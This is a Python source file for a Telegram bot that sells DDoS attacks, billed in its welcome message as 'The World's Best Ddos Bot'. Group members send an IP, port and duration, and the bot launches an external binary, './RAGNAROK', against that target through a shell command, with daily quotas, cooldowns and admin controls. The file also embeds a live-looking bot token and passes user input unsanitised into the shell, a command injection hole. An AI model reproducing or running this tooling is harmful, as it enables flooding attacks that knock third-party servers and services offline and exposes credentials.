#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7717857615:AAEz3LCDteEZGYtVRmPt_0D9w76jD6c0Jk8')

# Admin user IDs
admin_id = ["5599402910"]
\
# Group and channel details
GROUP_ID = "-1002155671416"
REQUIRED_CHANNELS = [
    "@RAGNAROKCRACKER",
    "@RAGNAROKCRACKS"
]

# Default cooldown and attack limits
COOLDOWN_TIME = 300  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to all required channels
def is_user_in_channel(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        return False

# Command to handle attacks
@bot.message_handler(commands=['attack1'])
def handle_attack(message):
    global global_last_attack_time
    user_id = str(message.from_user.id)

    # Ensure user is in the group
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "This bot can only be used in the specified group. Join - https://t.me/bgmisellingbuying")
        return

    # Ensure user is a member of all required channels
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"You must join all required channels to use this bot:\n"
                              + "\n".join(REQUIRED_CHANNELS))
        return

    # Check global cooldown
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"An attack is already in progress. Please wait {remaining_time} seconds.")
        return

    # Initialize user data if not present
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]

    # Check user's daily attack limit
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
        return

    # Parse command arguments
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack1 <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    if time_duration > 240:
        bot.reply_to(message, "Error: Attack duration cannot exceed 230 seconds.")
        return

    # Execute the attack via the binary
    full_command = f"./RAGNAROK {target} {port} {time_duration}"
    try:
        bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
                              f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, f"Attack completed on Target: {target}, Port: {port}, Time: {time_duration} seconds.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
        return

    # Update user data and global cooldown
    user['attacks'] += 1
    user['last_attack'] = datetime.datetime.now()
    global_last_attack_time = datetime.datetime.now()
    save_users()

# Command to check global cooldown
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/bgmisellingbuying"
    bot.reply_to(message, response)

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
